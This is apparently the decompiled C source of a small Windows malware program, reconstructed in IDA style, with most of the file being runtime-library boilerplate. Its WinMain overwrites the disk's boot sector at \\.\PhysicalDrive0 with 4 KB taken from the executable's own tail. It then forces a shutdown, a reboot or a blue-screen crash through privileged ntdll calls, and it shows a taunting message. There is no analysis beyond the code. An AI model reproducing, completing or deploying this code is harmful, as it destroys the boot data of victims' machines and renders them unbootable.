/* 
Reversed by sigma
maybe obfuscated
*/

#include <windows.h>
#include <math.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

BOOL sub_401000();
int __thiscall sub_401112(void *this);
BOOL sub_401213();
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
int sub_401420();
int sub_401428();
int __cdecl UserMathErrorFunction();
int sub_401A16();
void sub_401A20();
char sub_401A2C();
void *sub_401A51();
void *sub_401A57();
// int __scrt_initialize_default_local_stdio_options(void); weak
BOOL sub_401A7A();
void *sub_401A86();
void *sub_401A8C();
LPTOP_LEVEL_EXCEPTION_FILTER sub_401C25();
// LONG __stdcall __scrt_unhandled_exception_filter(struct _EXCEPTION_POINTERS *ExceptionInfo); idb
void sub_401C72();
void sub_401C7A();
void __cdecl sub_401CA6(); // idb
// __vcrt_bool __cdecl __vcrt_uninitialize(__vcrt_bool Terminating);
// void *__cdecl memset(void *, int Val, size_t Size);
int sub_4035F7();
int __cdecl sub_4035FD(int a1);
// _DWORD __stdcall unknown_libname_5(_DWORD); weak
int __cdecl sub_403675(int a1);
// int __cdecl unknown_libname_6(void *Block); idb
void *__cdecl sub_403B79(void **a1);
void *__cdecl sub_403B94(void **a1);
// int __dcrt_uninitialize_environments_nolock(void); weak
int __cdecl sub_403EFA(int a1);
__int32 sub_403FC8();
int sub_404087();
// int __cdecl _set_new_mode(int NewMode);
void *sub_4040BC();
// _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_404164(int a1, int a2);
int __cdecl sub_40418C(int a1, int a2);
int __cdecl sub_404415(_onexit_t Function); // idb
// int __cdecl _register_onexit_function(_onexit_table_t *Table, _onexit_t Function);
char sub_4044A9();
char sub_4044D5();
__vcrt_bool sub_40451A();
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_40497C(int a1, int a2);
int __cdecl sub_4049A4(int a1, int a2);
int __cdecl sub_4049CC(int a1, int a2);
int __cdecl sub_4049F4(int a1, int a2);
int __cdecl sub_404E34(int a1);
// void __cdecl _invalid_parameter_noinfo();
// unsigned int *__cdecl __doserrno();
// int *__cdecl _errno();
// void __cdecl _free_base(void *Block);
int __thiscall sub_405410(_DWORD **this, void *Block);
// int unknown_libname_11(void); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_40551A(int a1, int a2);
// int __acrt_update_thread_multibyte_data(void); weak
// int __acrt_update_thread_locale_data(void); weak
char *__cdecl sub_406FA1(void *Block, unsigned int a2, unsigned int a3);
char sub_40702A();
int __cdecl sub_407104(int a1);
// _DWORD __stdcall __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_407208(int a1, int a2);
struct __crt_locale_data *__cdecl sub_407A57(int a1, struct __crt_locale_data **a2);
void *__cdecl sub_407A84(int a1, void **a2);
// size_t __cdecl _msize(void *Block);
// void *__cdecl _realloc_base(void *Block, size_t Size);
int sub_408742();
// _DWORD __cdecl common_flush_all(_DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_408B10(int a1, int a2);
int sub_4098D6();
// void __usercall sub_409B74(char a1@<ch>, int a2@<ebp>);
// int _ffexpm1(void); weak
// int isintTOS(void); weak
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_40A4B6(int a1, int a2);
int __cdecl sub_40A4DE(int a1);
// BOOL __stdcall IsProcessorFeaturePresent(DWORD ProcessorFeature);
// void _SEH_epilog4_GS();

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HMODULE (__stdcall *LoadLibraryW)(LPCWSTR lpLibFileName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead);
// extern BOOL (__stdcall *ExitWindowsEx)(UINT uFlags, DWORD dwReason);
// extern int (__stdcall *MessageBoxW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
int dword_41200C = 1; // weak
void *Block = &unk_412358; // idb
wchar_t *off_412580 = L"         (((((                  H"; // weak
int dword_4126A0 = -2; // weak
union _SLIST_HEADER ListHead; // idb
_UNKNOWN unk_412AC8; // weak
_UNKNOWN unk_412AD0; // weak
int dword_412AD8; // weak
int dword_412B8C; // weak
void *dword_412CA8; // idb
void *dword_412CAC; // idb
int dword_412CB8; // weak
int dword_412CC0; // weak
int dword_412CC4; // weak
_UNKNOWN unk_412CC8; // weak
_onexit_table_t stru_412CCC; // idb
int dword_412F38[128]; // weak
int dword_413138; // weak
struct __crt_locale_data *dword_41313C; // idb
HANDLE hHeap; // idb
_UNKNOWN unk_41317C; // weak
_UNKNOWN unk_413180; // weak
int dword_413188; // weak


//----- (00401000) --------------------------------------------------------
BOOL sub_401000()
{
  HMODULE ModuleHandleA; // eax
  HANDLE FileA; // esi
  DWORD FileSize; // eax
  HANDLE FileW; // esi
  DWORD NumberOfBytesRead; // [esp+8h] [ebp-1110h] BYREF
  char Buffer[4096]; // [esp+Ch] [ebp-110Ch] BYREF
  CHAR Filename[264]; // [esp+100Ch] [ebp-10Ch] BYREF

  ModuleHandleA = GetModuleHandleA(0);
  GetModuleFileNameA(ModuleHandleA, Filename, 0x104u);
  FileA = CreateFileA(Filename, 0x80000000, 1u, 0, 3u, 0x80u, 0);
  FileSize = GetFileSize(FileA, 0);
  SetFilePointer(FileA, FileSize - 4097, 0, 0);
  ReadFile(FileA, Buffer, 0x1000u, &NumberOfBytesRead, 0);
  CloseHandle(FileA);
  FileW = CreateFileW(L"\\\\.\\PhysicalDrive0", 0x10000000u, 3u, 0, 3u, 0, 0);
  if ( FileW == (HANDLE)-1 )
  {
    MessageBoxW(0, L"Failed 1", L"Error", 0x10u);
    ExitProcess(1u);
  }
  if ( !WriteFile(FileW, Buffer, 0x1000u, &NumberOfBytesRead, 0) )
  {
    MessageBoxW(0, L"Failed 2", L"Error", 0x10u);
    ExitProcess(2u);
  }
  return CloseHandle(FileW);
}

//----- (00401112) --------------------------------------------------------
int __thiscall sub_401112(void *this)
{
  FARPROC NtSetSystemPowerState; // eax
  int v3; // esi
  int v5; // esi
  int v6; // esi
  UINT v7; // eax
  HMODULE LibraryW; // [esp+Ch] [ebp-20h]
  FARPROC NtShutdownSystem; // [esp+10h] [ebp-1Ch]
  HMODULE v10; // [esp+14h] [ebp-18h]
  int (__stdcall *v11)(); // [esp+18h] [ebp-14h]
  HMODULE hLibModule; // [esp+1Ch] [ebp-10h]
  FARPROC RtlAdjustPrivilege; // [esp+20h] [ebp-Ch]
  char v14; // [esp+27h] [ebp-5h] BYREF

  hLibModule = LoadLibraryW(L"ntdll.dll");
  RtlAdjustPrivilege = GetProcAddress(hLibModule, "RtlAdjustPrivilege");
  LibraryW = LoadLibraryW(L"ntdll.dll");
  NtShutdownSystem = GetProcAddress(LibraryW, "NtShutdownSystem");
  v10 = LoadLibraryW(L"ntdll.dll");
  NtSetSystemPowerState = GetProcAddress(v10, "NtSetSystemPowerState");
  v11 = NtSetSystemPowerState;
  if ( RtlAdjustPrivilege )
  {
    v3 = ((int (__stdcall *)(int, int, _DWORD, char *))RtlAdjustPrivilege)(19, 1, 0, &v14);
    FreeLibrary(hLibModule);
    if ( v3 )
      return 0;
    NtSetSystemPowerState = v11;
  }
  if ( !NtSetSystemPowerState
    || (v5 = ((int (__stdcall *)(int, int, int))NtSetSystemPowerState)(6, 6, 65546), FreeLibrary(v10), v5) )
  {
    if ( !NtShutdownSystem || (v6 = ((int (__stdcall *)(void *))NtShutdownSystem)(this), FreeLibrary(LibraryW), v6) )
    {
      v7 = 8;
      if ( this != (void *)2 )
        v7 = 0;
      if ( this == (void *)1 )
        v7 = 2;
      if ( !ExitWindowsEx(v7, 4u) )
      {
        MessageBoxW(0, L"I can't power off the computer.\nYou're lucky this time...", L"Error - NT", 0x10u);
        return 0;
      }
    }
  }
  return 1;
}

//----- (00401213) --------------------------------------------------------
BOOL sub_401213()
{
  HMODULE LibraryW; // ebx
  HMODULE v1; // eax
  FARPROC NtRaiseHardError; // edi
  int v3; // esi
  BOOL result; // eax
  FARPROC RtlAdjustPrivilege; // [esp+Ch] [ebp-10h]
  int v6; // [esp+10h] [ebp-Ch] BYREF
  char v7; // [esp+17h] [ebp-5h] BYREF

  LibraryW = LoadLibraryW(L"ntdll.dll");
  RtlAdjustPrivilege = GetProcAddress(LibraryW, "RtlAdjustPrivilege");
  v1 = LoadLibraryW(L"ntdll.dll");
  NtRaiseHardError = GetProcAddress(v1, "NtRaiseHardError");
  v6 = 0;
  result = (!RtlAdjustPrivilege
         || (v3 = ((int (__stdcall *)(int, int, _DWORD, char *))RtlAdjustPrivilege)(19, 1, 0, &v7),
             FreeLibrary(LibraryW),
             !v3))
        && ((int (__stdcall *)(int, _DWORD, _DWORD, _DWORD, int, int *))NtRaiseHardError)(-1073741818, 0, 0, 0, 6, &v6);
  return result;
}
// 401213: using guessed type int var_C;

//----- (004012A7) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  HMODULE ModuleHandleA; // eax
  HANDLE FileA; // esi
  DWORD FileSize; // eax
  DWORD NumberOfBytesRead; // [esp+8h] [ebp-114h] BYREF
  unsigned __int8 Buffer; // [esp+Fh] [ebp-10Dh] BYREF
  CHAR Filename[264]; // [esp+10h] [ebp-10Ch] BYREF

  sub_401000();
  Sleep(0x3E8u);
  ModuleHandleA = GetModuleHandleA(0);
  GetModuleFileNameA(ModuleHandleA, Filename, 0x104u);
  FileA = CreateFileA(Filename, 0x80000000, 1u, 0, 3u, 0x80u, 0);
  FileSize = GetFileSize(FileA, 0);
  SetFilePointer(FileA, FileSize - 1, 0, 0);
  ReadFile(FileA, &Buffer, 1u, &NumberOfBytesRead, 0);
  CloseHandle(FileA);
  if ( Buffer == 3 )
    return sub_401213();
  else
    return sub_401112(Buffer);
}
// 401000: using guessed type int sub_401000(void);
// 401112: using guessed type int __thiscall sub_401112(_DWORD);
// 401213: using guessed type int sub_401213(void);

//----- (00401420) --------------------------------------------------------
int sub_401420()
{
  __scrt_initialize_default_local_stdio_options();
  return 0;
}
// 401A5D: using guessed type int __scrt_initialize_default_local_stdio_options(void);

//----- (00401428) --------------------------------------------------------
int sub_401428()
{
  int v0; // eax

  sub_401C25();
  v0 = UserMathErrorFunction();
  return _set_new_mode(v0);
}

//----- (00401A13) --------------------------------------------------------
int __cdecl UserMathErrorFunction()
{
  return 0;
}

//----- (00401A16) --------------------------------------------------------
int sub_401A16()
{
  return 1;
}

//----- (00401A20) --------------------------------------------------------
void sub_401A20()
{
  InitializeSListHead(&ListHead);
}

//----- (00401A2C) --------------------------------------------------------
char sub_401A2C()
{
  return 1;
}

//----- (00401A51) --------------------------------------------------------
void *sub_401A51()
{
  return &unk_412AC8;
}

//----- (00401A57) --------------------------------------------------------
void *sub_401A57()
{
  return &unk_412AD0;
}

//----- (00401A7A) --------------------------------------------------------
BOOL sub_401A7A()
{
  return dword_41200C == 0;
}
// 41200C: using guessed type int dword_41200C;

//----- (00401A86) --------------------------------------------------------
void *sub_401A86()
{
  return &unk_413180;
}

//----- (00401A8C) --------------------------------------------------------
void *sub_401A8C()
{
  return &unk_41317C;
}

//----- (00401C25) --------------------------------------------------------
LPTOP_LEVEL_EXCEPTION_FILTER sub_401C25()
{
  return SetUnhandledExceptionFilter(__scrt_unhandled_exception_filter);
}

//----- (00401C72) --------------------------------------------------------
void sub_401C72()
{
  dword_412AD8 = 0;
}
// 412AD8: using guessed type int dword_412AD8;

//----- (00401C7A) --------------------------------------------------------
void sub_401C7A()
{
  ;
}
// 401C7A: could not find valid save-restore pair for edi

//----- (00401CA6) --------------------------------------------------------
void __cdecl sub_401CA6()
{
  ;
}
// 401CA6: could not find valid save-restore pair for edi

//----- (004035F7) --------------------------------------------------------
int sub_4035F7()
{
  return dword_412B8C;
}
// 412B8C: using guessed type int dword_412B8C;

//----- (004035FD) --------------------------------------------------------
int __cdecl sub_4035FD(int a1)
{
  int result; // eax

  result = a1;
  dword_412B8C = a1;
  return result;
}
// 412B8C: using guessed type int dword_412B8C;

//----- (00403675) --------------------------------------------------------
int __cdecl sub_403675(int a1)
{
  return unknown_libname_5(a1);
}
// 40362B: using guessed type _DWORD __stdcall unknown_libname_5(_DWORD);

//----- (00403B79) --------------------------------------------------------
void *__cdecl sub_403B79(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_412CAC )
    return (void *)unknown_libname_6(*a1);
  return result;
}

//----- (00403B94) --------------------------------------------------------
void *__cdecl sub_403B94(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_412CA8 )
    return (void *)unknown_libname_6(*a1);
  return result;
}

//----- (00403EFA) --------------------------------------------------------
int __cdecl sub_403EFA(int a1)
{
  int result; // eax

  result = a1;
  dword_412CB8 = a1;
  return result;
}
// 412CB8: using guessed type int dword_412CB8;

//----- (00403FC8) --------------------------------------------------------
__int32 sub_403FC8()
{
  return _InterlockedExchange(&dword_412CC0, 1);
}
// 412CC0: using guessed type int dword_412CC0;

//----- (00404087) --------------------------------------------------------
int sub_404087()
{
  return dword_412CC4;
}
// 412CC4: using guessed type int dword_412CC4;

//----- (004040BC) --------------------------------------------------------
void *sub_4040BC()
{
  return &unk_412CC8;
}

//----- (00404164) --------------------------------------------------------
int __cdecl sub_404164(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(
           &v3,
           a2,
           &v4);
}
// 404113: using guessed type _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD);
// 404164: using guessed type int var_8;

//----- (0040418C) --------------------------------------------------------
int __cdecl sub_40418C(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(
           &v3,
           a2,
           &v4);
}
// 4040C2: using guessed type _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD);
// 40418C: using guessed type int var_8;

//----- (00404415) --------------------------------------------------------
int __cdecl sub_404415(_onexit_t Function)
{
  return _register_onexit_function(&stru_412CCC, Function);
}

//----- (004044A9) --------------------------------------------------------
char sub_4044A9()
{
  unknown_libname_5(&off_412580);
  return 1;
}
// 40362B: using guessed type _DWORD __stdcall unknown_libname_5(_DWORD);
// 412580: using guessed type wchar_t *off_412580;

//----- (004044D5) --------------------------------------------------------
char sub_4044D5()
{
  __dcrt_uninitialize_environments_nolock();
  return 1;
}
// 403BAF: using guessed type int __dcrt_uninitialize_environments_nolock(void);

//----- (0040451A) --------------------------------------------------------
__vcrt_bool sub_40451A()
{
  return __vcrt_uninitialize(0);
}

//----- (0040497C) --------------------------------------------------------
int __cdecl sub_40497C(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(
           &v3,
           a2,
           &v4);
}
// 404888: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(_DWORD, _DWORD, _DWORD);
// 40497C: using guessed type int var_8;

//----- (004049A4) --------------------------------------------------------
int __cdecl sub_4049A4(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(
           &v3,
           a2,
           &v4);
}
// 404838: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(_DWORD, _DWORD, _DWORD);
// 4049A4: using guessed type int var_8;

//----- (004049CC) --------------------------------------------------------
int __cdecl sub_4049CC(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(
           &v3,
           a2,
           &v4);
}
// 4048E9: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(_DWORD, _DWORD, _DWORD);
// 4049CC: using guessed type int var_8;

//----- (004049F4) --------------------------------------------------------
int __cdecl sub_4049F4(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(
           &v3,
           a2,
           &v4);
}
// 404934: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(_DWORD, _DWORD, _DWORD);
// 4049F4: using guessed type int var_8;

//----- (00404E34) --------------------------------------------------------
int __cdecl sub_404E34(int a1)
{
  return unknown_libname_5(a1);
}
// 40362B: using guessed type _DWORD __stdcall unknown_libname_5(_DWORD);

//----- (00405410) --------------------------------------------------------
int __thiscall sub_405410(_DWORD **this, void *Block)
{
  int v3; // edi

  v3 = unknown_libname_11();
  if ( v3 )
  {
    _free_base(Block);
    return v3;
  }
  else
  {
    *this[1]++ = Block;
    return 0;
  }
}
// 405445: using guessed type int unknown_libname_11(void);

//----- (0040551A) --------------------------------------------------------
int __cdecl sub_40551A(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(
           &v3,
           a2,
           &v4);
}
// 4054D7: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD);
// 40551A: using guessed type int var_8;

//----- (00406FA1) --------------------------------------------------------
char *__cdecl sub_406FA1(void *Block, unsigned int a2, unsigned int a3)
{
  size_t v4; // edi
  unsigned int v5; // esi
  char *v6; // ebx
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  savedregs = (int)&savedregs;
  if ( a2 && 0xFFFFFFE0 / a2 < a3 )
  {
    *_errno() = 12;
    return 0;
  }
  else
  {
    if ( Block )
      v4 = _msize(Block);
    else
      v4 = 0;
    v5 = a3 * a2;
    v6 = (char *)_realloc_base(Block, a3 * a2);
    if ( v6 )
    {
      if ( v4 < v5 )
        memset(&v6[v4], 0, v5 - v4);
    }
    return v6;
  }
}

//----- (0040702A) --------------------------------------------------------
char sub_40702A()
{
  hHeap = 0;
  return 1;
}

//----- (00407104) --------------------------------------------------------
int __cdecl sub_407104(int a1)
{
  return unknown_libname_5(a1);
}
// 40362B: using guessed type _DWORD __stdcall unknown_libname_5(_DWORD);

//----- (00407208) --------------------------------------------------------
int __cdecl sub_407208(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(
           &v3,
           a2,
           &v4);
}
// 4071AE: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(_DWORD, _DWORD, _DWORD);
// 407208: using guessed type int var_8;

//----- (00407A57) --------------------------------------------------------
struct __crt_locale_data *__cdecl sub_407A57(int a1, struct __crt_locale_data **a2)
{
  struct __crt_locale_data *result; // eax

  result = *a2;
  if ( *a2 != dword_41313C )
  {
    result = (struct __crt_locale_data *)dword_4126A0;
    if ( (dword_4126A0 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = (struct __crt_locale_data *)__acrt_update_thread_locale_data();
      *a2 = result;
    }
  }
  return result;
}
// 406EDA: using guessed type int __acrt_update_thread_locale_data(void);
// 4126A0: using guessed type int dword_4126A0;

//----- (00407A84) --------------------------------------------------------
void *__cdecl sub_407A84(int a1, void **a2)
{
  void *result; // eax

  result = *a2;
  if ( *a2 != Block )
  {
    result = (void *)dword_4126A0;
    if ( (dword_4126A0 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = (void *)__acrt_update_thread_multibyte_data();
      *a2 = result;
    }
  }
  return result;
}
// 4059CF: using guessed type int __acrt_update_thread_multibyte_data(void);
// 4126A0: using guessed type int dword_4126A0;

//----- (00408742) --------------------------------------------------------
int sub_408742()
{
  return common_flush_all(1);
}
// 40874B: using guessed type _DWORD __cdecl common_flush_all(_DWORD);

//----- (00408B10) --------------------------------------------------------
int __cdecl sub_408B10(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(
           &v3,
           a2,
           &v4);
}
// 408A78: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(_DWORD, _DWORD, _DWORD);
// 408B10: using guessed type int var_8;

//----- (004098D6) --------------------------------------------------------
int sub_4098D6()
{
  dword_413188 = IsProcessorFeaturePresent(0xAu);
  return 0;
}
// 413188: using guessed type int dword_413188;

//----- (00409B74) --------------------------------------------------------
void __usercall sub_409B74(char a1@<ch>, int a2@<ebp>)
{
  *(_BYTE *)(a2 - 144) = -2;
  if ( a1 && !isintTOS() )
    JUMPOUT(0x409F33);
  _ffexpm1();
  JUMPOUT(0x409E78);
}
// 409BC1: control flows out of bounds to 409E78
// 409BE3: control flows out of bounds to 409F33
// 409CCE: using guessed type int _ffexpm1(void);
// 409D11: using guessed type int isintTOS(void);

//----- (0040A4B6) --------------------------------------------------------
int __cdecl sub_40A4B6(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(
           &v3,
           a2,
           &v4);
}
// 40A434: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(_DWORD, _DWORD, _DWORD);
// 40A4B6: using guessed type int var_8;

//----- (0040A4DE) --------------------------------------------------------
